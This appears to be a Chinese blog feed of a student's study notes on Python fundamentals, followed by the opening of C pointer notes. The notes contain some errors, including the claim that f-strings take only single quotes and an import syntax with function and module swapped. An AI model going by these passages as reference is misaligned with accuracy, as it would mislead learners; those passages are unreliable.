<p>10、像if、while、def和class的复合语句，首行<strong>以关键字开始，以冒号(:) 结束</strong>，跟在这后面的语句构成一个代码组</p>
<p>11、输出：print（<strong>没有f！</strong>）</p>
<p>（1）python中的print默认输出是换行的，若要不换行，需要在变量末尾加上end=””（双引号中有什么符号，代表着与下行的输出之间是否有符号存在）</p>
<p>（2）print() 圆括号中不再像c语言中需要双引号，可以直接填入变量，若是加上双引号则表示引号内的是字符串，作为一个字符串输出。</p>
<p>（3）print( )也可像c语言一样使用，使用%d,%s,%c等一系列的符号，在一段输出的语句中插入值，但是注意要在后面的变量值前也加上%，如果要插入不止一个变量值，需要用圆括号括起来</p>
<p>（4）（3）中的作用其实也可直接把变量放入到应放到的位置，就是本来可能完整的字符串会变成零碎</p>
<p>12、导入模块：使用import或者from  ······  import        模块：somemodule（代表某个模块）</p>
<p>(1)<strong>import somemodule</strong> ：将整个模块导入</p>
<p>(2)<strong>from somemodule import somefunction</strong> ：从某个模块中导入某个函数</p>
<p>(3)<strong>from somemodule import firstfunc,secondfunc,thirdfunc</strong> ：从某个模块导入多个函数</p>
<p>(4)**from somemodule import ***：将整个模块的全部函数导入</p>
<p> （类似c语言中的预命令的声明）</p>
<p>13、help()：圆括号里面填写其他函数名，可以显示一个函数的文档说明</p>
<p>14、当字符串内容为浮点型时转换为整型时，不能直接用(int)() 转换，要先用(float)()再用(int)()</p>
<p>15、python中变量不需要定义声明类型，只有在赋值以后变量才会被创建，用=进行赋值，为变量赋上什么类型的值，变量就是什么类型的，所以变量可以通过赋值指向不同类型的对象</p>
<p>可以同时为多个变量赋值：a=b=c=1；</p>
<p>按顺序给多个变量进行赋值：a，b，c，=1，2，“runoob”</p>
<p>16、**type()**函数用来查询变量所指向的对象类型，圆括号直接输入变量，运行后即可输出所对应的对象类型</p>
<p><strong>isinstance(变量名,类型名)</strong> 判断变量名是否属于该类型名。是，输出True；不是，输出False</p>
<p>区别：type()不会认为子类是一种父类类型；isinstance()会认为子类是一种父类类型</p>
<p>17、删除对象引用：<strong>del var1,var2,var3…,varN</strong></p>
<p>删除单个或多个对象的引用：<strong>del var或者 del var1,var2</strong></p>
<p>18、数值运算：</p>
<p>（1）数值的除法有两个运算符：**/与//**       **/**表示返回一个浮点数     **//**表示返回一个整数</p>
<p>（2）乘方表示为：a**b （表示为a的b次方）</p>
<p>（3）混合运算时，python会把整型数转换成浮点数</p>
<p>（4）其他数值运算符号与c无差别</p>
<p>19、<strong>round(x,y)</strong> ：对x进行四舍六入五看齐，奇进偶不进，y表示保留小数点后的位数</p>
<p>20、<strong>range()</strong> ：创造一个数列</p>
<p>（1）<strong>range(x)</strong> 创造一个在[0,x-1]之间整数数列，x可为负数</p>
<p>（2）<strong>range(x,y)</strong> 创造一个在[x,y-1]之间的整数数列，x，y均可为负数</p>
<p>（3）<strong>range(x,y,z)</strong> 创造一个在[x,y-1]之间的整数数列，z为步长，不写时默认步长为1</p>
<p>21、<strong>pass</strong> 输入这个在python中用作占位，执行了不会产生任何效果，可用来占据某些如if语句判断后不想执行任何语句可写入pass</p>
<p>22、输入函数：从标准输入（默认键盘）读取一行文本</p>
<p>（1）raw_input：单纯的读取一个行，返回一个字符串</p>
<p>（2）input：可以接受一个表达式作为输入，并且将计算结果返回</p>
<h3 id="二、数据类型"><a href="#二、数据类型" class="headerlink" title="二、数据类型"></a>二、数据类型</h3><p><strong>注：数字，字符串，元组为不可改变的数据；列表，字典，集合为可改变的数据</strong></p>
<p>1、数字类型（Number）：</p>
<p>（1）int：python3中唯一的整数类型，表示为长整型，取消了以往的long</p>
<p>（2）bool：布尔型，只有True（值为1）和False（值为0）两种  （True与False可以与数字进行加减，并且首字母为大写，是关键字不可写错！）</p>
<p>（3）float：浮点型，也就是俗称小数</p>
<p>（4）complex：复数。如1+2j（python用j表示虚数，实部1和虚部2都是浮点型数据）</p>
<p>（5）二进制数：0b  ；八进制数：0o； 十六进制数：0x</p>
<p>2、字符串（String）</p>
<p>（1）字符串截取格式：<strong>变量[头下标:尾下标]</strong> （从左往右以0作为开始值，从右往左以-1作为开始值。当尾下标为具体值时，只会取到其前一个的字符）</p>
<p>特别的：截取可以接收第三个参数，作为截取的步长（没有时默认为1）；如果步长为负数表示逆向读取</p>
<p>（2）**+** 是字符串的连接符，可以连接两个字符串（或者被字符串赋值的变量） </p>
<p>字符串(变量)*a：表示字符串（变量）复制a次 </p>
<p>（3）f-string格式字符串：格式为<strong>f ‘ 字符串或者是{字符串表达式}’</strong> 字符串表达式就会把计算后的值替换进去（f后面的只能用单引号）</p>
<table>
<thead>
<tr>
<th>转义字符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>(在行尾时)</td>
<td>续行符</td>
</tr>
<tr>
<td>\ \</td>
<td>反斜杠符号</td>
</tr>
<tr>
<td>\ ‘</td>
<td>单引号</td>
</tr>
<tr>
<td>\ “</td>
<td>双引号</td>
</tr>
<tr>
<td>\a</td>
<td>响铃</td>
</tr>
<tr>
<td>\b</td>
<td>退格(Backspace)</td>
</tr>
<tr>
<td>\000</td>
<td>空</td>
</tr>
<tr>
<td>\n</td>
<td>换行</td>
</tr>
<tr>
<td>\v</td>
<td>纵向制表符</td>
</tr>
<tr>
<td>\t</td>
<td>横向制表符</td>
</tr>
<tr>
<td>\r</td>
<td>回车</td>
</tr>
<tr>
<td>\f</td>
<td>换页</td>
</tr>
<tr>
<td>\oyy</td>
<td>八进制数，<strong>yy</strong> 代表的字符，例如：<strong>\o12</strong> 代表换行，其中 o 是字母，不是数字 0。</td>
</tr>
<tr>
<td>\xyy</td>
<td>十六进制数，yy代表的字符，例如：\x0a代表换行</td>
</tr>
<tr>
<td>\other</td>
<td>其它的字符以普通格式输出</td>
</tr>
</tbody></table>
<p>3、列表（List）</p>
<p>（1）列表支持数字，字符串，以及嵌套列表</p>
<p>列表元素是写在**[ ]<strong>之间的，用</strong>逗号**分隔开不同的元素（每个逗号前都是一个元素）</p>
<p>（2）列表截取格式：<strong>变量[头下标:尾下标]</strong>  （从左往右以0作为开始值，从右往左以-1作为开始值。）</p>
<p>如图所示，其表示方法与字符串截取的规则一致</p>
<p><img src="/2020/11/09/2020-11-09-Python%E7%AC%94%E8%AE%B0/%E5%88%97%E8%A1%A8%E6%88%AA%E5%8F%96%E6%A0%BC%E5%BC%8F-1609204379399.png"></p>
<p>（3）**+** 也是列表的连接符，可以连接两个列表 </p>
<p>​          列表*a  ：表示列表复制a次</p>
<p>（4）可将列表的某段赋值为[ ]，而删去元素。如：a=[1,2,3,4]  a[0:2]=[ ]   那么列表a的内容将变为[3,4]</p>
<p>（5）特别的：截取可以接收第三个参数，作为截取的步长（没有时默认为1）；如果步长为负数表示逆向读取</p>
<p>（6）删除列表：del 列表名；删除列表某个元素： del 列表名[n]</p>
<p>（7）在列表里嵌套列表：输出整个大列表时，小列表是在[ ]里，不同的小列表用逗号隔开。</p>
<p>访问大列表中的小列表：把小列表整个看做一个元素，那么<strong>大列表名[0]<strong>输出的就是第一个的整个小列表，如果要访问小列表中元素，就写成</strong>大列表名[0] [0]</strong> 表示访问第一个小列表里面的第一个元素</p>
<p>4、元组（Tuple）</p>
<p>（1）元组里面的类型也可以不相同，与列表相似，不同在于元组的元素不能修改并且元组元素写在**( )** 里面，使用逗号把各元素隔开</p>
<p>（2）截取格式，+与*等的用法与字符串、列表一致，就不再说第三次了</p>
<p>（3）空元组：tup1=( )   一个元素的元组：tup2=(1,)  注意有<strong>逗号</strong>  </p>
<p>（4）元组里面元素是不可变的，但是可以通过使用列表作为元素，就会是指向的该列表不变，但是列表的内容可变。并且元组可以变长，通过+运算，进行加长元组</p>
<p>（5）元组同样可用 del 元组名  把元组删去（单个元素不可变，无法删除）</p>
<p>5、集合（Set）</p>
<p>（1）集合：是由一个或多个形态各异的大小整体组成，这些整体被称为元素或成员</p>
<p>（2）使用**{  }** 或者**set(元素)**进行创建 （如果要创建空集合，只能用set()函数，因为{}里面为空被用来表示一个空字典，而若是包含多个元素，需要在多个圆括号如set((多个元素))  ）</p>
<p>（3）各个元素之间用逗号隔开；并且用print输出集合时，集合中重复的元素会被删去</p>
<p>（4）<strong>set()</strong> 创建的集合间可以进行运算“-，|，&amp;，^”</p>
<p>减号：表示减号前的集合有的而减号后的集合没有的元素</p>
<p>| ：表示两个集合的并集</p>
<p>&amp;：表示两个集合间的交集</p>
<p>^：表示两个集合间不同时存在的元素（交集以外的元素）</p>
<p>（5）**集合名.add(一个元素)**：只能添加一个元素到集合里面，如果已存在则不进行任何操作；</p>
<p>（6）<strong>集合名.update(一或多个元素)</strong> ：添加一或多个元素到集合里面。（多个元素需要用{}括起来，并且元素间逗号隔开。另：此方法可用于列表，元组，字典）</p>
<p>注：当元素为字符串时，如果要把字符串整体加入集合中，需要把字符串用{}括起来，否则，将会被拆成一个个字符放入到集合</p>
<p>（7）<strong>集合名.remove(一个元素)或者集合名.discard(一个元素)</strong> 只能删除一个元素</p>
<p>（8）<strong>集合名.pop()</strong> 随机删去集合里的一个元素</p>
<p>6、字典（Dictionary）</p>
<p>（1）字典：一个内置的数据类型，是无序的对象集合。使用<strong>键（key）</strong>来存取元素</p>
<p>（2）字典里面每一个对是由：<strong>键(key):值(value)</strong> 构成的。格式：<strong>d={key1:value1,key2:value2,……}</strong></p>
<p>键是不可变的数据类型（数字，字符串，元组），并且在同一字典里键是唯一的，重复的键以最后的为主</p>
<p>（3）可以通过<strong>字典名[键名]=值</strong> 往字典里面填充元素，同样这也可以用来修改键对应的值 ；使用<strong>del 字典名[键名]</strong> 来删去一个键；如果直接 **del 字典名 ** 将删去整个字典</p>
<p>（4）读取字典里面的值时，需要在<strong>字典名[ ]</strong> 方括号里面填入键名，从而通过键名输出其相应的值，如果在print()里面输入字典名，会将整个字典都输出</p>
<p>（5）用**dict()**创建字典：字典名=dict([(键名1，值1),(键名2，值2),……])； </p>
<p>字典名=dict(键名1=值1,键名2=值2……)</p>
<p>或者如：字典名={x:x**2 for x in (2,4,6)} 类似与表达式一样的创建字典    </p>
<p>（6）<strong>字典名={}</strong> ：定义一个空字典                </p>
<p>7、数据类型转换</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>int(x,base)</td>
<td>将x转换为一个整数，如果base为16，8进制时（十进制是默认的），x是字符串形式</td>
</tr>
<tr>
<td>float(x)</td>
<td>将x转换到一个浮点数</td>
</tr>
<tr>
<td>complex(real,imag)</td>
<td>创建一个复数</td>
</tr>
<tr>
<td>str(x)</td>
<td>将对象 x 转换为字符串</td>
</tr>
<tr>
<td>repr(x)</td>
<td>将对象 x 转换为表达式字符串</td>
</tr>
<tr>
<td>eval(str)</td>
<td>用来计算在字符串中的有效Python表达式,并返回一个对象</td>
</tr>
<tr>
<td>tuple(s)</td>
<td>将序列 s 转换为一个元组</td>
</tr>
<tr>
<td>list(s)</td>
<td>将序列 s 转换为一个列表</td>
</tr>
<tr>
<td>set(s)</td>
<td>转换为可变集合</td>
</tr>
<tr>
<td>dict(d)</td>
<td>创建一个字典。d 必须是一个 (key, value)元组序列。</td>
</tr>
<tr>
<td>frozenset(s)</td>
<td>转换为不可变集合</td>
</tr>
<tr>
<td>chr(x)</td>
<td>将一个整数转换为一个字符</td>
</tr>
<tr>
<td>ord(x)</td>
<td>将一个字符转换为它的整数值</td>
</tr>
<tr>
<td>hex(x)</td>
<td>将一个整数转换为一个十六进制数</td>
</tr>
<tr>
<td>oct(x)</td>
<td>将一个整数转换为一个八进制数</td>
</tr>
<tr>
<td>bin(x)</td>
<td>将一个整数转换为一个二进制数</td>
</tr>
</tbody></table>
<h3 id="三、运算符（只记录与c不同的符号）"><a href="#三、运算符（只记录与c不同的符号）" class="headerlink" title="三、运算符（只记录与c不同的符号）"></a>三、运算符（只记录与c不同的符号）</h3><p>1、算术运算符</p>
<p>（1）a**b ：a的b次方</p>
<p>（2）a//b：a除以b，取结果的整数部分（不是四舍五入，是直接取整数部分！另：如果a或b有是浮点数的，结果会多个小数点以及小数点后一位0）</p>
<p>（3）*：乘号，也是前面所提及字符串，列表，元组里面的重复符号</p>
<p>（4）/：除号，结果<strong>永远</strong>是返回一个浮点数</p>
<p>python中没有自加符号，只能通过a+=1，或者a=a+1代替</p>
<p>2、比较运算符</p>
<p>（1）a==b：判断两者是否相等（为什么会提？因为c里面也常忘记，用成赋值符号=而出错）</p>
<p>3、赋值运算符</p>
<p>（1）a** =b：等效于 a **b，a的b次方</p>
<p>（2）a//=b：等效于a//b，结果取a除以b的整数部分</p>
<p>（3）:=  ：海象运算符，可以在表达式的内部为变量赋值</p>
<p>4、位运算符（全都一样）</p>
<p>5、逻辑运算符</p>
<p>（1） x and y：类似c语言的逻辑与 &amp;&amp;，不同在于判断式为真，返回的是y的计算值，c语言只会返回1</p>
<p>（2）or ：类似于c语言的逻辑或 ||，同样，如果没发生逻辑短路，计算到了y，那么也是返回y 的计算值</p>
<p>（3）not：这个就是c语言中的逻辑非 ！</p>
<p>6、成员运算符</p>
<p>（1）a in 某序列：判断a是否在序列（列表，集合，元组，字典）中。在，则返回True；不在，返回False</p>
<p>（2）a not in 某序列：判断a如果不在某序列中，返回True；在，返回False</p>
<p>7、身份运算符</p>
<p>（1）a is b ：判断a与b是否引用的是同一个对象（类似在比较地址是否一样），是，返回True；不是，返回False</p>
<p>（2）is not  ：类似上方的not in</p>
<p><strong>注：Python里面的每个变量只是个单纯的名字。而所取到的值，可以被很多变量取到。但是只要是同一个值，那么地址就是一样的，只有一个地址，一个值，一个对象。这也是数字类型和字符串类型不能被修改的原因。而这与c的变量具有自己的地址空间是不同的理念</strong></p>
<p>PS：注里的话语在脚本式编程环境绝对成立，而在交互式环境中，编译器会有小整数池概念，会把（-5，256）的数预先创好，而当变量超过这个范围，就会指向不同的对象，地址也会变化</p>
<h3 id="四、语句结构"><a href="#四、语句结构" class="headerlink" title="四、语句结构"></a>四、语句结构</h3><p>1、if条件语句：python中使用elif代替了c语言中的else if </p>
<p>所以格式为 <strong>if 语句1:</strong></p>
<p>​                            <strong>执行语句1</strong></p>
<p>​                    <strong>elif 语句2:</strong></p>
<p>​                            <strong>执行语句2</strong></p>
<p>​                    <strong>else 语句3:</strong></p>
<p>​                            <strong>执行语句3</strong> </p>
<p>其中elif可以有无数行 ；并且后面的语句的圆括号可加可不加，当然c语言中是要加的（python没有switch语句）</p>
<p>判断条件为假：0；False；’ ‘；None  条件为真：非0；True；”None” ;字符串不为空</p>
<p>2、while循环语句（不存在do while语句）</p>
<p>（1）while 语句格式：<strong>while 判断条件:</strong></p>
<p>​                                                <strong>执行语句</strong></p>
<p>（2）python中while语句中可以使用else语句进行执行while中判断错误而跳转到else语句中</p>
<p>（3）break用于跳出当前循环，并且与while同等缩进的else也不执行</p>
<p>（4）continue用法与c中一致</p>
<p>3、for循环语句</p>
<p>（1）格式：<strong>for 变量/元素/字符串等等 in 列表/元组/集合/字符串/字典/:</strong></p>
<p>​                                <strong>执行语句</strong></p>
<p>​                      <strong>else:</strong></p>
<p>​                                <strong>执行语句</strong></p>
<p>（2）for 后面如果是一个随意的变量名，则代表该变量可以是in后面的序列中的任何一个，从左往右开始把元素赋值给该变量</p>
<p>（3）如果变成例如for x in range(len(序列名))，那么赋值给x 的是0，1，2这样的数字。如果按照（1）的格式写循环语句，那么len(x) 输出的才是序号</p>
<p>（4）break与continue的用法与在while中一致</p>
<p>（5）for语句经常与range()搭配使用，构成顺序的循环条件</p>
<h3 id="五、迭代器与生成器"><a href="#五、迭代器与生成器" class="headerlink" title="五、迭代器与生成器"></a>五、迭代器与生成器</h3><p>1、迭代：访问集合元素的一种方式</p>
<p>2、迭代器</p>
<p>（1）可以记住遍历位置的对象</p>
<p>（2）是从集合的第一个对象开始访问，直到所有元素被访问完为止。迭代器只能向前不能退后</p>
<p>（3）创建方法：<strong>iter(创建对象)</strong>    创建对象：字符串，列表，元组</p>
<h3 id="六、函数"><a href="#六、函数" class="headerlink" title="六、函数"></a>六、函数</h3><p>1、自定义函数</p>
<p>（1）格式：<strong>def 函数名 (参数列表):</strong></p>
<p>​                             <strong>函数体</strong></p>
<p>（2）以<strong>return 表达式</strong> 作为结束，返回一个表达式的值；不要返回值时写成<strong>return</strong> 则返回None，或者直接不要return；python中return可以返回多个值，以元组的形式返回</p>
<p>2、调用函数：通过直接输入<strong>函数名()</strong> 有参数则在里面输入参数，无参的则为空括号</p>
<p>3、对象可变与不可变：在函数中调用的参数，如果是不可变对象：字符串、数字、元组对象，那么不会对原本的参数造成影响；而如果是可变对象：字典、列表，那么在函数内部对其的修改是真正的会影响本来的参数</p>
<p>4、参数</p>
<p>（1）必须参数：按照定义函数的形参个数一一对应输入实参进行运算，否则会出错</p>
<p>（2）关键字参数：调用时把参数名以及对应的值全都放入到圆括号里面，那么此时，可以不按顺序输入</p>
<p>（3）默认参数：在自定义函数中，已经为某些变量进行赋值，那么这些变量在调用时，如果不输入则会使用已经赋好的值，如果有则以调用时输入的值为准</p>
<p>（4）不定长参数：在参数前面加上*构成不定长参数，而不定长参数会以元组形式导入，存放所有未命名的变量参数。还有一种带有**的参数，将会以字典形式导入。注：在不定长参数后面的参数必须关键字参数输入方式</p>
<p>（5）匿名函数：<strong>函数名=lambda arg1,arg2…… ：表达式</strong> </p>
<p>只有一个语句，不能访问参数列表之外的或全局命名空间里面的参数</p>
<h3 id="七、日期与时间"><a href="#七、日期与时间" class="headerlink" title="七、日期与时间"></a>七、日期与时间</h3><p>1、python中提供time和calendar模块用于格式化日期和时间</p>
<p>2、时间间隔是以秒为单位的浮点数</p>
<p>3、每个时间戳都是从1970年1月1日午夜经过多少时间表示（时间戳最适于做日期运算，但目前只支持到2038年）</p>
<p>4、import time ；localtime = time.asctime( time.localtime(time.time()) ) 可获得格式化日期</p>
<p>5、获取某月日历：import calendar ； calendar.month(2016,1)</p>
<h3 id="八、模块"><a href="#八、模块" class="headerlink" title="八、模块"></a>八、模块</h3><p>1、<strong>import 模块名</strong>：引入模块，类似一个声明语句（模块，在我看来就像c的头文件）</p>
<p>2、<strong>模块名.函数名</strong> ：调用模块里面的函数</p>
<p>3、如果只想单独的调用几个函数，可以使用<strong>from 函数名 import 模块名</strong> </p>
<p>4、**from 模块名 import * **  ：把一个模块中的所有内容导入到当前的命名空间，那么此时调用函数，直接输入函数名即可，无需再像2那样去调用</p>
<p>5、命名空间是一个包含了变量名称们（键） 和他们各自对应的对象们（值）的字典</p>
<p>6、dir(模块名)函数会返回一个模块里面定义的函数名</p>
<h3 id="九、文件"><a href="#九、文件" class="headerlink" title="九、文件"></a>九、文件</h3><table>
<thead>
<tr>
<th>模式</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>t</td>
<td>文本模式 (默认)。</td>
</tr>
<tr>
<td>x</td>
<td>写模式，新建一个文件，如果该文件已存在则会报错。</td>
</tr>
<tr>
<td>b</td>
<td>二进制模式。</td>
</tr>
<tr>
<td>+</td>
<td>打开一个文件进行更新(可读可写)。</td>
</tr>
<tr>
<td>U</td>
<td>通用换行模式（不推荐）。</td>
</tr>
<tr>
<td>r</td>
<td>以只读方式打开文件。文件的指针将会放在文件的开头。这是默认模式。</td>
</tr>
<tr>
<td>rb</td>
<td>以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。一般用于非文本文件如图片等。</td>
</tr>
<tr>
<td>r+</td>
<td>打开一个文件用于读写。文件指针将会放在文件的开头。</td>
</tr>
<tr>
<td>rb+</td>
<td>以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。一般用于非文本文件如图片等。</td>
</tr>
<tr>
<td>w</td>
<td>打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</td>
</tr>
<tr>
<td>wb</td>
<td>以二进制格式打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。</td>
</tr>
<tr>
<td>w+</td>
<td>打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</td>
</tr>
<tr>
<td>wb+</td>
<td>以二进制格式打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。</td>
</tr>
<tr>
<td>a</td>
<td>打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td>
</tr>
<tr>
<td>ab</td>
<td>以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td>
</tr>
<tr>
<td>a+</td>
<td>打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。</td>
</tr>
<tr>
<td>ab+</td>
<td>以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写。</td>
</tr>
</tbody></table>
<p>file object=open(文件名,模式,buffering值)  </p>
<p>buffering值为0，不会有寄存；为1，访问文件时会寄存行；大于1的整数，表示这是寄存区的缓冲大小；取负值，寄存区的缓冲大小为系统默认（第三个可写，可不写）</p>
<p>打开文件后，会有一个file对象</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>file.closed</td>
<td>返回true如果文件已被关闭，否则返回false。</td>
</tr>
<tr>
<td>file.mode</td>
<td>返回被打开文件的访问模式。</td>
</tr>
<tr>
<td>file.name</td>
<td>返回文件的名称。</td>
</tr>
<tr>
<td>file.softspace</td>
<td>如果用print输出后，必须跟一个空格符，则返回false。否则返回true。</td>
</tr>
</tbody></table>
<h3 id="十、面向对象"><a href="#十、面向对象" class="headerlink" title="十、面向对象"></a>十、面向对象</h3><p>1、类定义：<strong>class 类名:</strong> </p>
<p>​                                属性，方法（函数）</p>
<p>（1）类看起来很像c的结构体，其中的属性，像结构体中的成员，方法（函数）是多出的一个特色的地方</p>
<p>（2）引用类中的属性和函数：<strong>实例化类对象.属性（或函数）</strong></p>
<p>（3）类的方法（函数）在函数名后的圆括号内需要多一个self代表类的实例</p>
<p>2、类的实例化：<strong>变量名=类名()</strong> </p>
<p>3、类中特殊的函数构造方法 **def __ init __(self,其他参数): ** 该函数定义后，在对类实例化后会自动调用该函数，所以，此时要在实例化类名后的圆括号内填入实参。</p>
<p>在该函数中，调用变量需要写成<strong>self.形参名(或属性)</strong></p>
<p>4、类的私有属性：在定义属性时在前面加两个下划线</p>
<p>5、类的私有方法：定义方法函数时，在前面加两个下划线</p>
<p>6、类的继承：<strong>class 子类(父类)</strong></p>
<p>（1）继承后，可以调用父类中的方法，并且可以进行改变</p>
<h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    可能产生异常的代码块<br><span class="hljs-keyword">except</span> [ (Error1, Error2, ... ) [<span class="hljs-keyword">as</span> e] ]:<br>    处理异常的代码块<span class="hljs-number">1</span><br><span class="hljs-keyword">except</span> [ (Error3, Error4, ... ) [<span class="hljs-keyword">as</span> e] ]:<br>    处理异常的代码块<span class="hljs-number">2</span><br><span class="hljs-keyword">except</span>  [Exception]:<br>    处理其它异常<br></code></pre></td></tr></table></figure>

<p>该格式中，[] 括起来的部分可以使用，也可以省略。其中各部分的含义如下：</p>
<ul>
<li>(Error1, Error2,…) 、(Error3, Error4,…)：其中，Error1、Error2、Error3 和 Error4 都是具体的异常类型。显然，一个 except 块可以同时处理多种异常。</li>
<li>[as e]：作为可选参数，表示给异常类型起一个别名 e，这样做的好处是方便在 except 块中调用异常类型（后续会用到）。</li>
<li>[Exception]：作为可选参数，可以代指程序可能发生的所有异常情况，其通常用在最后一个 except 块。</li>
</ul>
<p>try except 语句的执行流程如下：</p>
<ol>
<li>首先执行 try 中的代码块，如果执行过程中出现异常，系统会自动生成一个异常类型，并将该异常提交给 Python 解释器，此过程称为捕获异常。</li>
<li>当 Python 解释器收到异常对象时，会寻找能处理该异常对象的 except 块，如果找到合适的 except 块，则把该异常对象交给该 except 块处理，这个过程被称为处理异常。如果 Python 解释器找不到处理异常的 except 块，则程序运行终止，Python 解释器也将退出</li>
</ol>
<p>事实上，不管程序代码块是否处于 try 块中，甚至包括 except 块中的代码，只要执行该代码块时出现了异常，系统都会自动生成对应类型的异常。但是，如果此段程序没有用 try 包裹，又或者没有为该异常配置处理它的 except 块，则 Python 解释器将无法处理，程序就会停止运行；反之，如果程序发生的异常经 try 捕获并由 except 处理完成，则程序可以继续执行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    a = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;输入被除数：&quot;</span>))<br>    b = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;输入除数：&quot;</span>))<br>    c = a / b<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;您输入的两个数相除的结果是：&quot;</span>, c )<br><span class="hljs-keyword">except</span> (ValueError, ArithmeticError):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;程序发生了数字格式异常、算术异常之一&quot;</span>)<br><span class="hljs-keyword">except</span> :<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;未知异常&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;程序继续运行&quot;</span>)<br></code></pre></td></tr></table></figure>

<figure class="highlight brainfuck"><table><tr><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">运行结果如下：</span><br><span class="hljs-comment">输入被除数：a</span><br><span class="hljs-comment">程序发生了数字格式异常、算术异常之一</span><br><span class="hljs-comment">程序继续运行</span><br></code></pre></td></tr></table></figure>

<p>上面程序中，第 6 行代码使用了（ValueError, ArithmeticError）来指定所捕获的异常类型，这就表明该 except 块可以同时捕获这 2 种类型的异常；第 8 行代码只有 except 关键字，并未指定具体要捕获的异常类型，这种省略异常类的 except 语句也是合法的，它表示可捕获所有类型的异常，一般会作为异常捕获的最后一个 except 块。</p>
<p>除此之外，由于 try 块中引发了异常，并被 except 块成功捕获，因此程序才可以继续执行，才有了“程序继续运行”的输出结果。</p>
]]></content>
  </entry>
  <entry>
    <title>c语言————指针与文件随手记</title>
    <url>/2020/10/24/2020-10-24-c%E8%AF%AD%E8%A8%80%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E6%8C%87%E9%92%88%E4%B8%8E%E6%96%87%E4%BB%B6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h1><h3 id="一、指针与指针变量"><a href="#一、指针与指针变量" class="headerlink" title="一、指针与指针变量"></a>一、指针与指针变量</h3><p>1、变量的指针：变量在内存中分配到的存储单元中的首地址</p>
<p>2、指针变量：变量所分配到的存储单元用来存放其他变量的地址（指针）</p>
<p>3、指针变量定义格式：*<em>类型标识符 <em>指针变量名;</em></em>  </p>
<p><em><em>另：如(int</em>)p这样的写法，表示把一个指针p所指向的类型强制转换为整型</em>*</p>
<p>4、定义为什么类型的指针变量，则只能指向该类型的变量的地址，否则将出错</p>
<p>5、指针变量的赋值：</p>
<p>（1）使用&amp;符号进行赋值：如<strong>ip=&amp;i</strong>（ip为指针变量。i为某变量）</p>
<p>（2）初始化：<strong>如int g，*ip=&amp;g</strong></p>
<p>（3）不同指针变量间的赋值：<strong>ip1=ip2</strong>（ip1，ip2为指针变量，<strong>且两者指向的数据类型必须相同</strong>）</p>
<p>（4）使用NULL赋空值，可以给指向任何数据类型的指针变量赋空值：<strong>p=NULL;</strong></p>
<p>（5）动态分配存储空间：使用new赋值：格式为：<strong>ip=new 类型名 或 ip=new 类型名[个数]<strong>（个数代表该指针变量可分配到多少个的某类型的存储单元，类型可以是结构体变量名。另</strong>ip首先必须是该类型的指针变量</strong>）</p>
<p>（6）delete删去new的创建对象释放其所占有的空间，格式为：<strong>delete ip 或 delete [ ]ip</strong> （后者删去拥有不止一块存储单元的指针变量，并且格式就是如此，[]内没有其他的东西）</p>
<p>6、如果 p=&amp;i ； 那么*p就等价于i ， *&amp;i也等价于i（理解为，p里面存储着变量的地址，而指针符号是指向该地址。所以，如果指针未赋值时， *ip可认为是一个未赋值的变量）</p>
<p>7、如果使用（*ip）++时，是否有圆括号表达不一样的意思：</p>
<p>有圆括号时：先*和ip结合，表示的是指针ip指向地址的变量在使用后数值加1</p>
<p>无圆括号时：ip先与++结合，又++在后边，则在使用完*ip后把ip的值加1，即为ip指向的不再是原本变量，而是地址更高的相邻变量</p>
<ul>
<li>指针常量：指向的数据是常量。如 const char* p = “abc”; p指向的内容是常量 ，但p本身不是常量，你可以让p再指向”123”。 </li>
<li>常量指针：指针本身是常量。如：char* const p = “abc”; p本身就是常量，你不能让p再指向”123”。 </li>
<li>指针常量 + 常量指针：指针和指针指向的数据都是常量。const char* const p =”abc”; 两者都是常量，不能再修改。</li>
</ul>
<h3 id="二、指针与数组"><a href="#二、指针与数组" class="headerlink" title="二、指针与数组"></a>二、指针与数组</h3><p>1、数组名是一个数组的首地址，例如一维数组a中a与&amp;a[0]都表示数组的首地址（一维数组中a[0]只表示元素，二维数组中a[0]表示第0列的首地址）</p>
<p>2、数组的首地址是<em><strong>常量</strong></em>，不能被改变</p>
